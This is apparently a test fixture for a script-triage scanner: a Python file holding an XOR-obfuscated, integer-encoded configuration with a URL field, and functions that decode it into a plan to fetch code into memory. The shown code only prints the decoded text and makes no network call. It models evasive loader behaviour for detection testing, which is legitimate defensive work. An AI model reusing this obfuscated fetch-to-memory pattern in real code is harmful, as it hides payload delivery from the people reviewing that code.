#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_ab66d46f = [108, 3, 6, 178, 28, 110, 91, 68, 189, 82, 123, 93, 69, 187, 6, 104, 91, 107, 188, 10, 119, 81, 64, 171, 67, 126, 87, 71, 190, 14, 110, 93, 92, 145, 2, 127, 83, 91, 188, 22, 102, 95, 80, 175, 31, 110, 91, 70, 243, 7, 110, 74, 68, 145, 12, 118, 87, 81, 160, 27, 69, 83, 81, 163, 0, 104, 71, 72, 189, 27, 123, 89, 81, 145, 12, 117, 75, 90, 186, 82, 43, 66, 71, 183, 1, 110, 95, 76, 243, 3, 115, 77, 64, 145, 12, 117, 83, 68, 188, 10, 114, 91, 90, 189, 6, 117, 80, 72, 161, 13, 124, 75, 71, 173, 14, 110, 87, 91, 160, 82, 124, 81, 70, 163, 14, 110, 97, 89, 175, 31, 102, 93, 85, 188, 29, 115, 91, 70, 243, 24, 114, 91, 81, 162, 48, 123, 76, 87, 166, 6, 108, 91, 72, 185, 6, 116, 90, 91, 185, 28, 69, 93, 92, 175, 6, 116, 3, 68, 161, 24, 127, 76, 71, 166, 10, 118, 82, 107, 186, 0, 69, 78, 77, 186, 7, 117, 80, 72, 173, 14, 119, 78, 85, 167, 8, 116, 97, 93, 170, 82, 121, 95, 89, 190, 14, 115, 89, 90, 227, 90, 34, 11, 87, 252, 90, 126, 8, 82, 250, 19, 111, 76, 88, 243, 7, 110, 74, 68, 189, 85, 53, 17, 1, 246, 90, 121, 12, 1, 170, 89, 124, 10, 26, 171, 23, 123, 83, 68, 162, 10, 52, 87, 90, 184, 14, 118, 87, 80, 225, 94, 35, 92, 81, 168, 92, 41, 15, 26, 190, 22, 102, 75, 71, 171, 29, 69, 95, 83, 171, 1, 110, 3, 124, 187, 1, 110, 76, 81, 189, 28, 74, 71, 64, 166, 0, 116, 17, 1, 246, 90, 121, 12, 1, 170, 89, 124, 10]

CODEC_ab66d46f = "integer_list|repeating_key_xor|1a,3e,34,ce,6f"



def load_ab66d46f():

    return bytes(MATERIAL_ab66d46f)



def decode_ab66d46f(e):

    key_bytes = (26, 62, 52, 206, 111,)

    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(e))



def recover_ab66d46f():

    n = ":".join(("north", "south"))

    for _pass in range(1):

        d = decode_ab66d46f(load_ab66d46f())

    t = d.decode("ascii", "strict")

    return t



def inspect_ab66d46f():

    return recover_ab66d46f()



def surface_ab66d46f():

    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))



def obfuscation_ab66d46f():

    return "{left}{right}".format_map({"left": "format_", "right": "map"})



def plan_ab66d46f():

    fields = dict(item.split("=", 1) for item in inspect_ab66d46f().split("|"))

    analysis_surface = surface_ab66d46f()

    obfuscation_surface = obfuscation_ab66d46f()

    operation_plan = ("http_client_memory", fields["url"], "memory-handoff")

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_ab66d46f())

